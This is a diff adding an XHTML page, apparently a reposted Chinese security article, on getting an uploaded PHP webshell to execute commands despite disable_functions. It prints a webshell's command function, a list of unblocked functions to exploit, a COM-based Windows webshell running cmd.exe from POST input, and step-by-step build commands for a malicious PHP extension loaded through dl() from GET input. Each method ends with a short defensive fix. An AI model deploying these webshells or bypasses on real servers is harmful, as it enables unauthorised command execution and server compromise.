@@ -1,0 +1,116 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>【Webshell】命令执行</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>【Webshell】命令执行</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&amp;mid=209904765&amp;idx=3&amp;sn=7308c06569e1e132d78d279f4317bccf&amp;chksm=2e4579921932f084f1314a24e43c60486757c9ab00744c2d19e1e97ea1f5de67389b4500f478&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&amp;mid=209904765&amp;idx=3&amp;sn=7308c06569e1e132d78d279f4317bccf&amp;chksm=2e4579921932f084f1314a24e43c60486757c9ab00744c2d19e1e97ea1f5de67389b4500f478&amp;scene=27#wechat_redirect</a></blockquote><p><span style="font-size: 18px;">上传webshell后，执行命令时或许没法执行了，我们分析下原理并想出绕过方式，防守方也必须根据绕过方式想想更强的防御。</span></p><p/><p><span style="font-size: 18px; background-color: rgb(75, 172, 198);"><strong style="margin: 0px; padding: 0px; border: 0px currentColor; font-family: inherit; font-style: inherit; vertical-align: baseline; box-sizing: border-box; background-color: transparent;">一、php webshell</strong><strong style="margin: 0px; padding: 0px; border: 0px currentColor; font-family: inherit; font-style: inherit; vertical-align: baseline; box-sizing: border-box; background-color: transparent;">执行命令原理</strong></span></p><p><span style="font-size: 18px;">php webshell（以下简称webshell)下是怎么执行系统命令的？我们找一个webshell分析下，搜索关键字定位到以下代码</span></p><pre style="padding: 0px; border: 0px currentColor; color: rgb(51, 51, 50); line-height: 32px; overflow: hidden; font-family: inherit; font-size: 18px; margin-top: 0px; margin-bottom: 30px; vertical-align: baseline; white-space: pre-wrap; word-break: break-all; word-wrap: break-word; box-sizing: border-box; background-color: rgb(255, 255, 255);" class="brush:php">function execute($cfe) {
+
+       $res = '';
+
+       if ($cfe) {
+
+              if(function_exists('system')) {
+
+                     @ob_start();
+
+                     @system($cfe);
+
+                     $res = @ob_get_contents();
+
+                     @ob_end_clean();
+
+              } elseif(function_exists('passthru')) {
+
+                     @ob_start();
+
+                     @passthru($cfe);
+
+                     $res = @ob_get_contents();
+
+                     @ob_end_clean();
+
+              } elseif(function_exists('shell_exec')) {
+
+                     $res = @shell_exec($cfe);
+
+              } elseif(function_exists('exec')) {
+
+                     @exec($cfe,$res);
+
+                     $res = join("\n",$res);
+
+              } elseif(@is_resource($f = @popen($cfe,"r"))) {
+
+                     $res = '';
+
+                     while(!@feof($f)) {
+
+                            $res .= @fread($f,1024);
+
+                     }
+
+                     @pclose($f);
+
+              }
+
+       }
+
+       return $res;
+
+}</pre><p><span style="font-size: 18px;">即按顺利调用system(),passthru(),shell_exec,exec,popen函数 成功调用就不再往下调用</span></p><p/><p><span style="font-size: 18px; background-color: rgb(75, 172, 198);"><strong style="margin: 0px; padding: 0px; border: 0px currentColor; font-family: inherit; font-style: inherit; vertical-align: baseline; box-sizing: border-box; background-color: transparent;">二、</strong><strong style="margin: 0px; padding: 0px; border: 0px currentColor; font-family: inherit; font-style: inherit; vertical-align: baseline; box-sizing: border-box; background-color: transparent;">禁止webshell</strong><strong style="margin: 0px; padding: 0px; border: 0px currentColor; font-family: inherit; font-style: inherit; vertical-align: baseline; box-sizing: border-box; background-color: transparent;">执行命令原理</strong></span></p><p><span style="font-size: 18px;">Php配置文件里面有个disable_functions = 配置，这个禁止某些php函数，</span></p><p><span style="font-size: 18px;">服务器便是用这个来禁止php的执行命令函数，</span></p><p><span style="font-size: 18px;">例如</span></p><pre style="padding: 0px; border: 0px currentColor; color: rgb(51, 51, 50); line-height: 32px; overflow: hidden; font-family: inherit; font-size: 18px; margin-top: 0px; margin-bottom: 30px; vertical-align: baseline; white-space: pre-wrap; word-break: break-all; word-wrap: break-word; box-sizing: border-box; background-color: rgb(255, 255, 255);" class="brush:php"><span style="font-size: 18px;">disable_functions =system,passthru,shell_exec,exec,popen</span></pre><p><span style="font-size: 18px;">便禁止了用这些函数来执行系统命令</span></p><p/><p><span style="font-size: 18px; background-color: rgb(75, 172, 198);"><strong style="margin: 0px; padding: 0px; border: 0px currentColor; font-family: inherit; font-style: inherit; vertical-align: baseline; box-sizing: border-box; background-color: transparent;">三、</strong><strong style="margin: 0px; padding: 0px; border: 0px currentColor; font-family: inherit; font-style: inherit; vertical-align: baseline; box-sizing: border-box; background-color: transparent;">黑名单绕过</strong></span></p><p><span style="font-size: 18px;">知道了原理后，我们便能想出很多绕过的方式</span></p><p><span style="font-size: 18px;">首先是黑名单绕过</span></p><p><span style="font-size: 18px;">我们看看php下能够执行系统命令的函数有哪些</span></p><pre style="padding: 0px; border: 0px currentColor; color: rgb(51, 51, 50); line-height: 32px; overflow: hidden; font-family: inherit; font-size: 18px; margin-top: 0px; margin-bottom: 30px; vertical-align: baseline; white-space: pre-wrap; word-break: break-all; word-wrap: break-word; box-sizing: border-box; background-color: rgb(255, 255, 255);" class="brush:php"><span style="font-size: 18px;">assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引号）</span></pre><p><span style="font-size: 18px;">那么 便可以看看php.ini中的disable_function漏过了哪些函数。</span></p><p><span style="font-size: 18px;">然后 hack it.</span></p><p><span style="font-size: 18px;">曾经在给某大企业做渗透测试时，未禁用assert 成功执行命令</span></p><p><span style="font-size: 18px;">乌云上的案例 未禁用proc_open而引起</span></p><p><span style="font-size: 18px;">http://www.wooyun.org/bugs/wooyun-2013-015991</span></p><p><span style="font-size: 18px;">解决方案：关注并收集php系统命令执行函数，补齐disable_function项。</span></p><p/><p><span style="font-size: 18px; background-color: rgb(75, 172, 198);"><strong style="margin: 0px; padding: 0px; border: 0px currentColor; font-family: inherit; font-style: inherit; vertical-align: baseline; box-sizing: border-box; background-color: transparent;">四、</strong><strong style="margin: 0px; padding: 0px; border: 0px currentColor; font-family: inherit; font-style: inherit; vertical-align: baseline; box-sizing: border-box; background-color: transparent;">系统组件绕过</strong></span></p><p><span style="font-size: 18px;">这个方法适用于windows</span></p><p><span style="font-size: 18px;">看代码</span></p><pre style="padding: 0px; border: 0px currentColor; color: rgb(51, 51, 50); line-height: 32px; overflow: hidden; font-family: inherit; font-size: 18px; margin-top: 0px; margin-bottom: 30px; vertical-align: baseline; white-space: pre-wrap; word-break: break-all; word-wrap: break-word; box-sizing: border-box; background-color: rgb(255, 255, 255);" class="brush:php">&lt;?php
+
+$command=$_POST[a];
+
+$wsh = new COM('WScript.shell');   // 生成一个COM对象
+
+$exec = $wsh-&gt;exec('cmd.exe /c '.$command); //调用对象方法来执行命令
+
+$stdout = $exec-&gt;StdOut();
+
+$stroutput = $stdout-&gt;ReadAll();
+
+echo $stroutput
+
+?&gt;</pre><p><span style="font-size: 18px;">Shell.Application也可以实现同样的效果</span></p><p><span style="font-size: 18px;">彻底的解决方案是 直接删除System32目录下wshom.ocx文件</span></p><p/><p/><p><span style="font-size: 18px; background-color: rgb(75, 172, 198);"><strong style="margin: 0px; padding: 0px; border: 0px currentColor; font-family: inherit; font-style: inherit; vertical-align: baseline; box-sizing: border-box; background-color: transparent;">五、</strong><strong style="margin: 0px; padding: 0px; border: 0px currentColor; font-family: inherit; font-style: inherit; vertical-align: baseline; box-sizing: border-box; background-color: transparent;">拓展库绕过</strong></span></p><p><span style="font-size: 18px;">Linux下可通过编译拓展库进行绕过</span></p><p><span style="font-size: 18px;">网络上的方法及官方的方法 都提示错误，</span></p><p><span style="font-size: 18px;">经过研究 给出一种正确编译PHP拓展库的方法</span></p><p><span style="font-size: 18px;"><strong style="margin: 0px; padding: 0px; border: 0px currentColor; font-family: inherit; font-style: inherit; vertical-align: baseline; box-sizing: border-box; background-color: transparent;">前方高能。</strong></span></p><p><span style="font-size: 18px;">首先得知PHP服务器php版本，下载个相同或相近版本的php源码包</span></p><pre style="padding: 0px; border: 0px currentColor; color: rgb(51, 51, 50); line-height: 32px; overflow: hidden; font-family: inherit; font-size: 18px; margin-top: 0px; margin-bottom: 30px; vertical-align: baseline; white-space: pre-wrap; word-break: break-all; word-wrap: break-word; box-sizing: border-box; background-color: rgb(255, 255, 255);" class="brush:bash">tar zxvf php-5.3.10.tar.gz  //解压缩
+
+cd php-5.3.10/ext      
+
+./ext_skel --extname=dl  //生成名为dl的拓展库
+
+cd dl
+
+vi config.m4</pre><p><span style="font-size: 18px;">将这三行</span></p><pre style="padding: 0px; border: 0px currentColor; color: rgb(51, 51, 50); line-height: 32px; overflow: hidden; font-family: inherit; font-size: 18px; margin-top: 0px; margin-bottom: 30px; vertical-align: baseline; white-space: pre-wrap; word-break: break-all; word-wrap: break-word; box-sizing: border-box; background-color: rgb(255, 255, 255);" class="brush:bash">PHP_ARG_WITH(dl, for dl support,
+
+Make sure that the comment is aligned:
+
+[  --with-dl             Include dl support])</pre><p><span style="font-size: 18px;">前面的dnl去掉并保存</span></p><pre style="padding: 0px; border: 0px currentColor; color: rgb(51, 51, 50); line-height: 32px; overflow: hidden; font-family: inherit; font-size: 18px; margin-top: 0px; margin-bottom: 30px; vertical-align: baseline; white-space: pre-wrap; word-break: break-all; word-wrap: break-word; box-sizing: border-box; background-color: rgb(255, 255, 255);" class="brush:bash">whereis phpize          //找出phpize路径
+
+/usr/local/bin/phpize     // 运行phpize
+
+vi dl.c</pre><p>在</p><pre style="padding: 0px; border: 0px currentColor; color: rgb(51, 51, 50); line-height: 32px; overflow: hidden; font-family: inherit; font-size: 18px; margin-top: 0px; margin-bottom: 30px; vertical-align: baseline; white-space: pre-wrap; word-break: break-all; word-wrap: break-word; box-sizing: border-box; background-color: rgb(255, 255, 255);" class="brush:bash">if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s", &amp;arg, &amp;arg_len) == FAILURE) {
+
+                return;
+
+        }</pre><p>这一行下添加</p><pre style="padding: 0px; border: 0px currentColor; color: rgb(51, 51, 50); line-height: 32px; overflow: hidden; font-family: inherit; font-size: 18px; margin-top: 0px; margin-bottom: 30px; vertical-align: baseline; white-space: pre-wrap; word-break: break-all; word-wrap: break-word; box-sizing: border-box; background-color: rgb(255, 255, 255);" class="brush:bash">system(arg);</pre><pre style="padding: 0px; border: 0px currentColor; color: rgb(51, 51, 50); line-height: 32px; overflow: hidden; font-family: inherit; font-size: 18px; margin-top: 0px; margin-bottom: 30px; vertical-align: baseline; white-space: pre-wrap; word-break: break-all; word-wrap: break-word; box-sizing: border-box; background-color: rgb(255, 255, 255);" class="brush:bash">whereis php-config  //找出php-config的路径
+
+./configure --whith-php-config=php-config路径
+
+make
+
+make install
+
+[root@TENCENT64 ~/php-5.3.10/ext/dl]# make install
+
+Installing shared extensions:     /usr/local/lib/php/extensions/no-debug-non-zts-20121212/</pre><p><span style="font-size: 18px;">成功生成了</span></p><p/><p><span style="font-size: 18px;">查看php.ini的</span></p><p><span style="font-size: 18px;">extension_dir 项</span></p><p><span style="font-size: 18px;">将</span></p><pre style="padding: 0px; border: 0px currentColor; color: rgb(51, 51, 50); line-height: 32px; overflow: hidden; font-family: inherit; font-size: 18px; margin-top: 0px; margin-bottom: 30px; vertical-align: baseline; white-space: pre-wrap; word-break: break-all; word-wrap: break-word; box-sizing: border-box; background-color: rgb(255, 255, 255);" class="brush:bash"><span style="font-size: 18px;">/usr/local/lib/php/extensions/no-debug-non-zts-20121212/dl.so</span></pre><p><span style="font-size: 18px;">拷贝到extension_dir目录下</span></p><p><span style="font-size: 18px;">若extension_dir目录无写权限则可写入任意目录用../../来绕过并调用。</span></p><p><span style="font-size: 18px;">利用代码：</span></p><pre style="padding: 0px; border: 0px currentColor; color: rgb(51, 51, 50); line-height: 32px; overflow: hidden; font-family: inherit; font-size: 18px; margin-top: 0px; margin-bottom: 30px; vertical-align: baseline; white-space: pre-wrap; word-break: break-all; word-wrap: break-word; box-sizing: border-box; background-color: rgb(255, 255, 255);" class="brush:php">&lt;?php
+dl("dl.so");  //dl.so在extension_dir目录，如不在则用../../来实现调用
+confirm_dl_compiled("$_GET[a]&gt;1.txt");
+?&gt;</pre><p><span style="font-size: 18px;">查看1.txt即可看到命令执行结果<strong style="margin: 0px; padding: 0px; border: 0px currentColor; font-family: inherit; font-style: inherit; vertical-align: baseline; box-sizing: border-box; background-color: transparent;"> </strong></span></p><p><span style="font-size: 18px;">防御方法：将dl函数加入disable_function中禁用</span></p><p class="info_news"><img data-src="http://mmbiz.qpic.cn/mmbiz/VcRPEU1K2ofpbawibzRO0NAUWpMCgOq3icCTBo83HBCiaXCTorpcQX8FTqjg7a0QEJF4WSrmh3KdhA8sp3HicdIjibg/0?wx_fmt=png" data-type="png" data-ratio="0.01782178217821782" data-w="" data-s="300,640" src="../Images/b49c635061b393d677b103db5512c265.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/VcRPEU1K2ofpbawibzRO0NAUWpMCgOq3icCTBo83HBCiaXCTorpcQX8FTqjg7a0QEJF4WSrmh3KdhA8sp3HicdIjibg/0?wx_fmt=png"/></p><p style="text-align: center;"><img data-src="http://mmbiz.qpic.cn/mmbiz/VcRPEU1K2odniaLDa6mSUJcsMvYSyW0J6luvL62cotrWoQmTrJueq1AuicJjC0GQPEmr2KGeRj98lqFwwiaIyW4cw/0?wx_fmt=png" data-type="png" data-ratio="0.9857142857142858" data-w="350" data-s="300,640" src="../Images/1a603f12bc2ae5cc27bb5a18bf74cacc.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/VcRPEU1K2odniaLDa6mSUJcsMvYSyW0J6luvL62cotrWoQmTrJueq1AuicJjC0GQPEmr2KGeRj98lqFwwiaIyW4cw/0?wx_fmt=png"/> </p><blockquote style="margin: 0px; padding: 10px 15px; border: 6px solid rgb(0, 187, 236); max-width: 100%; border-top-left-radius: 50px; border-bottom-right-radius: 50px; box-shadow: 5px 5px 2px rgb(165,165,165);" class="wxqq-borderTopColor wxqq-borderRightColor wxqq-borderBottomColor wxqq-borderLeftColor"><p><span style="color: rgb(0, 0, 0);"><strong>交流与合作：</strong></span><strong><span style="color: rgb(255, 0, 0);">QQ/微信：252011267</span></strong> </p><p>QQ群：16004488（计算机与网络安全）</p><p>微信群：中国黑客联盟，进群请加微信：252011267</p></blockquote>
+        
+</body>
+</html>
